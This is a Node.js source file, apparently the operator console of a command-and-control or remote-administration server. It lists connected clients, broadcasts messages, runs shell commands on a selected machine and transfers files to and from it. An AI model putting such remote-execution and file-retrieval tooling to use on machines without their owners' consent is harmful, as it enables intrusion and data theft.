const readline = require('readline')
const fs = require('fs')
const chalk = require('chalk')
const { clients } = require('./tls-com-sock')
const { fsClients } = require('./tls-file-sock')
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

/**
 * Get file from client and write to file in current directory
 * @param {socket} client - file socket descriptor
 * @param {string} destination - UNC path to where file exists on remote client
 * @param {function} cb - Callback
 */
const getFile = (client, destination, cb) => {
    if (destination) {
        console.log('destination', destination)
        let destfs = fs.createWriteStream('./' + destination)

        client.pipe(destfs)

        if (cb) {
            cb()
        }

        client.on('end', () => {
            console.log('File should be written')
            destfs.close()
        })

        destfs.on('error', (err) => {
            console.log(err)
        })
    }
}

/**
 * Function to send a file over socket to client
 * @param {socket} client - file socket descriptor
 * @param {string} localFile - UNC path to local file
 * @param {function} cb - Callback
 */
const sendFile = (client, localFile, cb) => {
    console.log(fs.existsSync(localFile))
    try {
        if (fs.existsSync(localFile)) {
            if (cb) {
                cb()
            } 

            let localfs = fs.createReadStream(localFile)

            localfs.on('open', () => {
                localfs.pipe(client)
            })

            localfs.on('error', (err) => {
                console.log(err)
            })

            localfs.on('end', () => {
                console.log('File fully sent\n')
                client.destroy()
                localfs.close()
            })
        }
    } catch (err) {
        console.log(err)
    }
}

/**
 * Purpose: this function handles individual client commands.
 * "exit" will exit controlling this specific selected client
 * "msg <msg>" will send a basic console.log() message to the client to display
 * "run <cmd>" will execute a shell command on client computer
 * "get <remote_filepath> <local_name>" will find the file on client and send response back to server
 * "send <local_filepath> <remote_name>" will find the file on server and send response to client
 * 
 * @param {socket} client : ref to specific client to execute commands
 */
const clientPrompt = (client) => {
    rl.question(`${client.connID}> `, (input) => {
        let tokens = input.split(" ")

        switch(tokens[0]) {
            case 'exit':
                prompt()
                break
            case 'rst':
                client.write('_+2')
                break
            case 'msg':
                client.write('_+1' + input.substr(4) + '\n')
                break
            case 'run':
                client.write('_+0' + input.substr(4) + '\n')
                //client.write('0' + input.substr(4))
                break
            case 'send':
                sendFile(fsClients[client.connID], tokens[1], () => {
                    client.write('_+3' + tokens[2])
                })
                break
            case 'get':
                getFile(fsClients[client.connID], tokens[2], () => {
                    client.write('_+5' + tokens[1])
                })
                break
            default:
                break
        }
        clientPrompt(client)
    })    
}

/**
 * Purpose: global prompt which handles cli commands to all clients
 * "lis" will display all connected clients on the server
 * "ann" will send an announcement to console.log on all connected clients
 * "sel" will call clientPrompt() function and select using the unique socket.connID handled in ../server.js
 */
const prompt = () => {
    rl.question(`global> `, (input) => {
        let tokens = input.split(" ")
        switch (tokens[0]) {
            case 'lis':
                Object.keys(clients).forEach((key) => {
                    console.log(key)
                })
                // Object.keys(fsClients).forEach((key) => {
                //     console.log('fs:' + key)
                // })
                break
            case 'ann':
                Object.keys(clients).forEach((key) => {
                    client = clients[key]
                    client.write(input.substr(4))
                })
                break
            case 'sync':
                Object.keys(clients).forEach((key) => {
                    client = clients[key]
                    client.write('_+4' + key)
                })
                break
            case 'sel':
                if (clients[tokens[1]]) {
                    clientPrompt(clients[tokens[1]])
                } else {
                    console.log(`Client ${tokens[1]} was not found.`)
                }
                break
            default:
                // displays on cli the instruction to use the tool
                console.log(chalk.red('\nPlease use the following syntax:\n') +
                            chalk.green('lis') + '         : list all clients\n' +
                            chalk.green('ann') + chalk.yellow(' <msg>') + '   : announce message to all clients\n' +
                            chalk.green('sel') + chalk.yellow(' <client>') + ': Select a specific client')
                break
        }
        prompt()
    })
}

module.exports = prompt